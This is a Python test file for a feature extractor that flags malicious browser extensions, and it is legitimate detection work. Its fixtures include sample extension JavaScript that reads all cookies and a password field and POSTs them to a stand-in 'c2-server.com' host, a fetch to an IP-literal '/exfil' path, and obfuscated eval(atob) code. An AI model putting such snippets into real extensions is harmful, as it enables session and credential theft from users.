"""Comprehensive unit tests for Phase 3: Versioned deterministic feature extractors (Groups A, B, C, D)."""

import json
from pathlib import Path

from backend.app.services.manifest_parser import parse_manifest_data
from ml.features.group_a_manifest import extract_group_a_manifest_features
from ml.features.group_b_js_static import compute_shannon_entropy, extract_group_b_js_features
from ml.features.group_c_obfuscation import extract_group_c_obfuscation_features
from ml.features.group_d_behavior import extract_group_d_behavior_features
from ml.features.pipeline import extract_features_from_directory
from ml.features.schema import (
    ALL_FEATURE_KEYS,
    DEFAULT_FEATURE_SCHEMA,
    FEATURE_SCHEMA_VERSION,
)


def test_feature_schema_consistency():
    schema = DEFAULT_FEATURE_SCHEMA
    assert schema.version == FEATURE_SCHEMA_VERSION
    assert len(schema.feature_names) == len(ALL_FEATURE_KEYS)
    # Check uniqueness
    assert len(set(ALL_FEATURE_KEYS)) == len(ALL_FEATURE_KEYS)


def test_group_a_manifest_extraction():
    manifest_data = {
        "manifest_version": 3,
        "name": "High Risk Extension",
        "version": "1.0.0",
        "permissions": ["cookies", "webRequest", "storage", "nativeMessaging"],
        "host_permissions": ["<all_urls>", "*://*.paypal.com/*"],
        "background": {"service_worker": "bg.js"},
        "content_scripts": [
            {"matches": ["<all_urls>"], "js": ["content.js"], "all_frames": True}
        ],
        "content_security_policy": {
            "extension_pages": "script-src 'self' 'unsafe-eval' https://remote-c2.com;"
        },
        "update_url": "https://malicious-server.com/crx",
    }
    manifest = parse_manifest_data(manifest_data)
    features, evidence = extract_group_a_manifest_features(manifest)

    assert features["manifest_version_num"] == 3.0
    assert features["perm_count_total"] == 4.0
    assert features["perm_count_high_risk"] >= 3.0  # cookies, webRequest, nativeMessaging
    assert features["perm_count_medium_risk"] >= 1.0  # storage
    assert features["has_broad_host_access"] == 1.0
    assert features["has_sensitive_host_patterns"] == 1.0  # paypal.com
    assert features["content_script_all_urls"] == 1.0
    assert features["content_script_all_frames"] == 1.0
    assert features["has_background_service_worker"] == 1.0
    assert features["csp_has_unsafe_eval"] == 1.0
    assert features["csp_has_remote_sources"] == 1.0
    assert features["update_url_is_external"] == 1.0
    assert features["has_native_messaging"] == 1.0
    assert len(evidence) >= 5


def test_group_b_js_static_extraction(tmp_path: Path):
    js_dir = tmp_path / "ext_js"
    js_dir.mkdir()

    js_code = """
    // Normal extension logic with sensitive calls
    chrome.cookies.get({url: 'https://example.com', name: 'session'}, function(cookie) {
        chrome.storage.local.set({saved: cookie});
    });
    chrome.tabs.query({active: true}, function(tabs) {
        console.log(tabs);
    });
    fetch("https://192.168.1.100/exfil", {
        method: "POST",
        body: JSON.stringify({data: 123})
    });
    eval("console.log('dynamic code');");
    new Function("return 42");
    """
    (js_dir / "background.js").write_text(js_code, encoding="utf-8")

    features, evidence, meta = extract_group_b_js_features(js_dir)

    assert features["js_file_count"] == 1.0
    assert features["call_chrome_cookies"] >= 1.0
    assert features["call_chrome_storage"] >= 1.0
    assert features["call_chrome_tabs"] >= 1.0
    assert features["call_fetch"] >= 1.0
    assert features["call_eval"] >= 1.0
    assert features["call_function_constructor"] >= 1.0
    assert features["ip_literal_url_count"] >= 1.0
    assert features["shannon_entropy_source"] > 3.0


def test_shannon_entropy():
    # Repeated constant characters have 0 entropy
    assert compute_shannon_entropy("AAAAAA") == 0.0
    # Diverse string has higher entropy
    h = compute_shannon_entropy("abcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()")
    assert h > 4.5


def test_group_c_minified_vs_obfuscated(tmp_path: Path):
    # Case 1: Standard Minified Code (e.g., jQuery-style)
    # Long line, but clean identifiers, no hex mangling, no rotation loops
    minified_dir = tmp_path / "minified_ext"
    minified_dir.mkdir()
    clean_minified = (
        "function a(e,t){return new a.fn.init(e,t)}a.fn=a.prototype={constructor:a,length:0};"
        + "var n=window.jQuery,r=window.$;a.noConflict=function(e){return window.$===a&&(window.$=r),a};"
        * 15
    )
    (minified_dir / "bundle.min.js").write_text(clean_minified, encoding="utf-8")

    feat_min, ev_min = extract_group_c_obfuscation_features(minified_dir)
    assert feat_min["is_minified_heuristic"] == 1.0
    assert feat_min["hex_identifier_count"] == 0.0
    assert feat_min["string_array_rotation_pattern"] == 0.0
    assert feat_min["obfuscation_risk_score"] == 0.0  # Must NOT penalize minified code

    # Case 2: Obfuscator.io / Malicious Obfuscation
    obf_dir = tmp_path / "obf_ext"
    obf_dir.mkdir()
    obf_code = """
    var _0x5a1b = ['log', 'cookie', 'Hello', 'World', 'exfil', 'test'];
    (function(_0x2d1a, _0x5b3c) {
        var _0x1c4e = function(_0x4e2a) {
            while (--_0x4e2a) {
                _0x2d1a.push(_0x2d1a.shift());
            }
        };
        _0x1c4e(++_0x5b3c);
    }(_0x5a1b, 0x1f4));
    var _0x3e1a = function(_0x1a2b) {
        return _0x5a1b[_0x1a2b];
    };
    eval(window.atob('Y29uc29sZS5sb2coJ3B3bmVkJyk='));
    """
    (obf_dir / "malware.js").write_text(obf_code, encoding="utf-8")

    feat_obf, ev_obf = extract_group_c_obfuscation_features(obf_dir)
    assert feat_obf["hex_identifier_count"] >= 5.0
    assert feat_obf["string_array_rotation_pattern"] >= 1.0
    assert feat_obf["atob_btoa_into_eval_or_func"] >= 1.0
    assert feat_obf["obfuscation_risk_score"] > 0.60
    assert any("Mangled hex identifiers" in e for e in ev_obf)


def test_group_d_behavior_combinations_and_overprivilege(tmp_path: Path):
    ext_dir = tmp_path / "behavior_ext"
    ext_dir.mkdir()

    # Extension declared cookies, management, and tabs, but only uses cookies
    manifest = parse_manifest_data({
        "manifest_version": 3,
        "name": "Combo Test",
        "version": "1.0",
        "permissions": ["cookies", "management", "tabs"],
        "host_permissions": ["<all_urls>"],
        "content_scripts": [
            {"matches": ["<all_urls>"], "js": ["content.js"]}
        ],
    })

    # Code that intercepts cookies + broad host + sends network
    # and form input reading
    code = """
    chrome.cookies.getAll({}, function(allCookies) {
        fetch('https://c2-server.com/collect', {
            method: 'POST',
            body: JSON.stringify(allCookies)
        });
    });
    var pass = document.querySelector('input[type="password"]').value;
    """
    (ext_dir / "script.js").write_text(code, encoding="utf-8")

    feat_a, _ = extract_group_a_manifest_features(manifest)
    feat_b, _, _ = extract_group_b_js_features(ext_dir)
    feat_d, ev_d = extract_group_d_behavior_features(manifest, ext_dir, feat_a, feat_b)

    # Over-privilege: management and tabs were declared but never used in JS
    assert feat_d["declared_unused_perm_count"] == 2.0
    # Critical combination: cookies + broad host + fetch
    assert feat_d["flag_cookies_broadhost_network"] == 1.0
    # Content script on all pages + password field access + fetch
    assert feat_d["flag_allpages_domform_network"] == 1.0
    assert any("CRITICAL COMBINATION" in e for e in ev_d)


def test_unified_feature_pipeline(tmp_path: Path):
    ext_dir = tmp_path / "pipeline_ext"
    ext_dir.mkdir()

    manifest_dict = {
        "manifest_version": 3,
        "name": "Pipeline Sample",
        "version": "1.0.0",
        "permissions": ["storage"],
        "host_permissions": ["https://api.github.com/*"],
    }
    (ext_dir / "manifest.json").write_text(json.dumps(manifest_dict), encoding="utf-8")
    (ext_dir / "app.js").write_text("console.log('clean app');", encoding="utf-8")

    feat_dict, feat_vector, evidence, meta = extract_features_from_directory(ext_dir)

    # Vector length must match schema exactly
    assert len(feat_vector) == len(ALL_FEATURE_KEYS)
    assert len(feat_dict) == len(ALL_FEATURE_KEYS)
    assert meta["schema_version"] == FEATURE_SCHEMA_VERSION

    # Determinism check: re-running gives exact same values
    feat_dict_2, feat_vector_2, _, _ = extract_features_from_directory(ext_dir)
    assert feat_vector == feat_vector_2
    assert feat_dict == feat_dict_2


def test_empty_extension_missing_value_policy(tmp_path: Path):
    empty_dir = tmp_path / "empty_ext"
    empty_dir.mkdir()

    manifest_dict = {
        "manifest_version": 2,
        "name": "Empty Ext",
        "version": "0.1",
        "permissions": [],
    }
    (empty_dir / "manifest.json").write_text(json.dumps(manifest_dict), encoding="utf-8")

    # Has no JavaScript files
    feat_dict, feat_vector, evidence, meta = extract_features_from_directory(empty_dir)

    assert len(feat_vector) == len(ALL_FEATURE_KEYS)
    # Ensure missing values are cleanly filled with 0.0, no NaNs
    for _key, val in feat_dict.items():
        assert isinstance(val, float)
        assert not (val != val)  # not NaN
    assert feat_dict["js_file_count"] == 0.0
    assert feat_dict["total_js_bytes"] == 0.0
